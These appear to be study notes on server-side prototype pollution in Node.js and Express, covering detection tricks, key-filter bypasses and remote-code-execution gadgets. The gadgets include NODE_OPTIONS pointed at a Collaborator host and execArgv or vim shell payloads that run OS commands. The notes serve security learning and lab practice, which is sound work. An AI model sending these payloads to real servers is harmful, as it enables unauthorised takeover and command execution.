- JS is typically used on the browser client side, but `Node.js` uses it on the server side. It is more difficult to detect than client sided code, because:

```bash

	- No access to source code
	- No developer tools
	- Often leads to DoS
	- The pollution will persist, no way to undo it

```

## Detecting the vulnerability

- The `for...in` loop in javascript iterates over all enumerable properties, including the ones in the property chain.

```javascript
const myObject = { a: 1, b: 2 };
Object.prototype.foo = 'bar'; // Pollution
myObject.hasOwnProperty('foo'); // false
for(const propertyKey in myObject){ 
	console.log(propertyKey); // a, b, foo
}
```

- This also applies to arrays:

```javascript
const myArray = ['a','b']; 
Object.prototype.foo = 'bar'; // Pollution
for(const arrayKey in myArray){ 
console.log(arrayKey); // 0, 1, foo
}
```

- If the application returns these properties in an response, this can be an option to detect server-sided prototype pollution. The best example is `POST`/`PUT` endpoints which expect `JSON` data, and return `JSON` data of the new state of the object:

```http
POST /user/update HTTP/1.1 
Host: vulnerable-website.com 
...
{ 
	"user":"wiener", 
	"firstName":"Peter", 
	"lastName":"Wiener", 
	"__proto__":{ 
		"foo":"bar" 
	} 
}
```

- With the response being:

```http
HTTP/1.1 200 OK 
... 
{ 
	"username":"wiener", 
	"firstName":"Peter",
	"lastName":"Wiener", 
	"foo":"bar" 
}
```

- This may lead to privilege escalation, if your user is modifiable with a value like `isAdmin`.

- Most of the time, this is not the case and you will not see the affected property reflected in the response.
- To still be able to detect this vulnerability, there are techniques where you can compare the servers behaviour before and after the injection to see whether its configuration has changed. These are non-destructive, but they still permanently change the server.

```bash

	- Status code override
	- JSON spaces override
	- Charset override

```

#### Status code override

- `Express` allows devs to set custom HTTP replies. These may even differ from the standard HTTP replies, where you can receive a `200 OK`, but the custom reply may not:

```http
HTTP/1.1 200 OK 
... 
{ 
	"error": { 
		"success": false, 
		"status": 401, 
		"message": "You do not have permission to access this resource." 
	} 
}
```

- In `Node.js`, the following code generates the status code of the response:

```javascript
function createError () { 
	//... 
	if (type === 'object' && arg instanceof Error) { 
		err = arg status = err.status || err.statusCode || status 
	}
	//...
}
```

- It tries to read the `status` and `statusCode` property of a error. If the developer of the website did not set a `status` property of an error, this may indicate prototype pollution:

```bash

	1. Trigger an error and note the status code
	2. Pollute the prototype with a obscure "status" property:

	{
		"user": "wiener",
		"role": "default"
		"__proto__": {
			"status":424
		}
	}

	3. Trigger the error again and check the status code

```

- For node applications, the status code must be between `400-599`, as everything else defaults to `500`!!!

#### JSON spaces override

- `Express` has an option called `json spaces` which allows devs to configure the number of spaces used to indent JSON data. It is often left undefined, as the default fits most devs. This means that it can be overwritten to check for server side prototype pollution.
- This is very valuable because it can be reverted by setting it to the default value again.
- This only works on Express versions before `4.17.5`!!!

#### Charset override

- `Express` implement `"middleware"` modules which enable preprocessing of requests before their actual handler. 
- `body-parser` is used to parse the body of incoming requests to generate a `req.body` object.
- The `read()` function of the `body-parser` takes in options, most importantly, the `charset`. `charset` is either derived from the request, from the `getCharset(req)` function call or defaults to `UTF-8`.
- This property is controllable via prototype pollution, as the developers of `Express` called `charset` as a property inside of `getCharset()`.
- These are the steps to identify this vulnerability via charset override:

```bash

	1. Add a UTF-7 encoded string to a property

	{
		"user": "wiener",
		"role": "+AGYAbwBv-" # "foo" in UTF-7
	}

	2. Check if the response appears in encoded form
	3. Pollute the prototype with a "content-type" property which specifies the         UTF-7 charset:

	   {
			"user": "wiener",
			"role": "default",
			"__proto__":{
				"content-type": "application/json; charset=utf-7"
			}
	   }

	4. Repeat the first request. Check if the response appears decoded!

```

### Server-side prototype pollution sources

- In practice this can be repetitive and time consuming. To automate this process, there is a `Server-Side Prototype Pollution Scanner` extension in Burp-Suite:

```bash

	1. Install the extension from the BApp store and enable it
	2. Explore the website to map content to the proxy history
	3. Go to the "Proxy > HTTP history" tab
	4. Filter the list to show only in-scope items
	5. Select all items
	6. Right click and go to "Extensions > Server-Side Prototype Pollution              Scanner > Server-Side Prototype Pollution" and select a scanning                 technique
	7. Modify the attack config, then click "OK" 

```

- The reported issues will be findable via the `Issue Activity` Panel on the `Dashboard and Targets` tabs.
- When using the Community Edition, you must go to `Extensions > Installed`.

- Developers often try to prevent or patch  these vulnerabilities by filtering keys like `__proto__`. This is not robust, as they can be bypassed:

```bash

	1. Obfuscate the prohibited words:

	   "__pro__proto__to__":{
		   "foo":"bar"
	   }

	2. Access the prototype via the constructor:

	   "constructor":{
		   "prototype":{
				"foo":"bar"
			}
	   }
```

## RCE

- Many of potential command execution sinks occur in the `child_process` module of node. These are invoked by a request that occurs asynchronously to the request with which your'e able to pollute the prototype. The best way to identify these requests is a collaborator call.
- `NODE_OPTIONS` is an environment variable which enables you to define a string of command-line arguments that should be used when starting a new Node process.
- If that is left undefined, it can be controlled via prototype pollution.

```json
"__proto__": { 
	"shell":"node", 
	"NODE_OPTIONS":"--inspect=YOUR-COLLABORATOR-                                     ID.oastify.com\"\".oastify\"\".com" 
}
```

- `child_process.spawn()` and `child_process.fork()` enable devs to create new Node subprocesses.
- The `fork()` method accepts an option called `execArgv`, which is an array of strings containing command line arguments used when spawning the child process. If left undefined by the devs, it is vulnerable to prototype pollution.
- This gadget lets you control command-line arguments, giving you more attack vectors as `NODE_OPTIONS`. The `--eval` argument for example, lets you pass JavaScript code which will be executed by the child process, allowing you to load additional modules:

```json
"execArgv": [ 
	"--eval=require('<module>')" 
]
```

- The `execSync()` method executes a string as a system command. By chaining these sinks, it can lead to full RCE:

```json
"__proto__": { 
	"execArgv":[ 
		"--eval=require('child_process').execSync('<OS CMD>')" 
	] 
}
```

- Here, the `child_process.execSync()` sink was injected using the `--eval` command. Sometimes the application uses this command itself to execute os commands.
- Similar to `fork()`, `execSync()` also accepts options, which are pollutable via the prototype chain. You can inject system commands by polluting `shell` and `input` properties:

```bash

1. "input" is passed to the child process "stdin" stream and executed as a          system command via "execSync()"
2. "shell" lets developers declare a shell. "execSync()" uses the system            shell, which leads to leaving this undefined.

```

- `vim` or `ex`  are tools which fulfill all criteria for RCE via this vulnerability. If they are installed on the server, this can lead to full RCE:

```json
"__proto__": {
	"shell":"vim",
	"input":":! <OS CMD>\n"
}
```